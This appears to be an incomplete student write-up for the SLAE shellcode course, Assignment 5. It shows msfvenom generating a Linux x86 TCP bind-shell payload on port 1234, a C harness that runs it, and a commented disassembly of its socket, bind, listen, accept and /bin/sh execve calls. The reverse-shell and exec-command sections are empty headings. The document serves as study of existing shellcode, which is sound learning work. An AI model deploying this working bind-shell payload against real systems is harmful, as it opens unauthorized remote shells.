### Shellcode No.1 - TCP Bind Shell ###

At first glance, we'll take payload linux/x86/shell_bind_tcp, very similar to the shellcode we wrote in the first SLAE exam task.

------------------------------------------------------------------------------------------------------------------------
```bash
jheba@AFI-JH SLAE % msfvenom -p linux/x86/shell_bind_tcp LPORT=1234 -f c
/usr/local/bin/msfvenom: line 14: cd: /Users/jheba/Desktop/OSCE: No such file or directory
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 78 bytes
Final size of c file: 354 bytes
unsigned char buf[] =
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";
```
------------------------------------------------------------------------------------------------------------------------
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
"\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a"
"\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0"
"\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0"
"\x0b\xcd\x80";


main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
------------------------------------------------------------------------------------------------------------------------
```bash
slae@ubuntu:~/exam-SLAE/Assignment-5$ ./shellcode 
Shellcode Length:  20
```
------------------------------------------------------------------------------------------------------------------------
```bash
slae@ubuntu:~/exam-SLAE/Assignment-5$ echo -ne "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x04\xd2\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" | ndisasm -u -
```
```nasm
00000000  31DB              xor ebx,ebx					; clearing the EBX register
00000002  F7E3              mul ebx 					; clearing the EAX and EDX registers
00000004  53                push ebx 					; pushing 0 on the stack as a first argument of socketcall syscall (IPPROTO_IP = 0 (null))
00000005  43                inc ebx 					; incrementing EBX by one for sys_socket call
00000006  53                push ebx 					; pushing second argument on the stack (SOCK_STREAM = 1)
00000007  6A02              push byte +0x2 				; pushing value 2 on the stack (third argument of socketcall syscall - AF_INET = 2 (PF_INET))
00000009  89E1              mov ecx,esp 				; directing the stack pointer to sys_socket() function arguments
0000000B  B066              mov al,0x66 				; call to socketcall syscall 
0000000D  CD80              int 0x80					; syscall execution (after this, sockfd will be saved in EAX as return value)
0000000F  5B                pop ebx 					; popping value 2 into the ebx (sys_bind call)
00000010  5E                pop esi
00000011  52                push edx 					; pushing 0 (null) which is necessary for that call
00000012  68020004D2        push dword 0xd2040002		; pushing d204 -> in reverse 04d2(hex) = 1234(dec) - our LPORT, and 0002(hex) = 2(dec) which is the third argument (it is like `push word 2` - AF_INET = 2)
00000017  6A10              push byte +0x10 			; pushing value 16, which is the socklen_t addrlen (size) = 16
00000019  51                push ecx 					; const struct sockaddr *addr - stack pointer with struct arguments	
0000001A  50                push eax 					; pushing our sockfd pointer
0000001B  89E1              mov ecx,esp 				; directing the stack pointer to sys_bind() function arguments
0000001D  6A66              push byte +0x66 			; pushing call to socketcall syscall on top of the stack
0000001F  58                pop eax 					; popping above value into EAX
00000020  CD80              int 0x80 					; syscall execution
00000022  894104            mov [ecx+0x4],eax 			; ECX points to the stack, so ECX+4 will points too -> pushing EAX on the stack
00000025  B304              mov bl,0x4 					; moving 4 to EBX (sys_listen call)
00000027  B066              mov al,0x66 				; call to socketcall syscall 
00000029  CD80              int 0x80 					; syscall execution
0000002B  43                inc ebx 					; incrementing EBX (sys_accept call)
0000002C  B066              mov al,0x66 				; call to socketcall syscall
0000002E  CD80              int 0x80 					; syscall execution (ECX already points to top of the stack (arguments))
00000030  93                xchg eax,ebx 				; 
00000031  59                pop ecx
00000032  6A3F              push byte +0x3f
00000034  58                pop eax
00000035  CD80              int 0x80
00000037  49                dec ecx
00000038  79F8              jns 0x32
0000003A  682F2F7368        push dword 0x68732f2f
0000003F  682F62696E        push dword 0x6e69622f
00000044  89E3              mov ebx,esp
00000046  50                push eax
00000047  53                push ebx
00000048  89E1              mov ecx,esp
0000004A  B00B              mov al,0xb
0000004C  CD80              int 0x80
```
```bash
slae@ubuntu:~/exam-SLAE/Assignment-5$ cat /usr/include/i386-linux-gnu/asm/unistd_32.h | grep 102
#define __NR_socketcall 102
```
```bash
slae@ubuntu:~/exam-SLAE/Assignment-5$ cat /usr/include/linux/net.h | grep sys_socket
#define SYS_SOCKET	1		/* sys_socket(2)		*/
```

# Shellcode No.2 - TCP Reverse Shell







# Shellcode No.3 - Exec Command
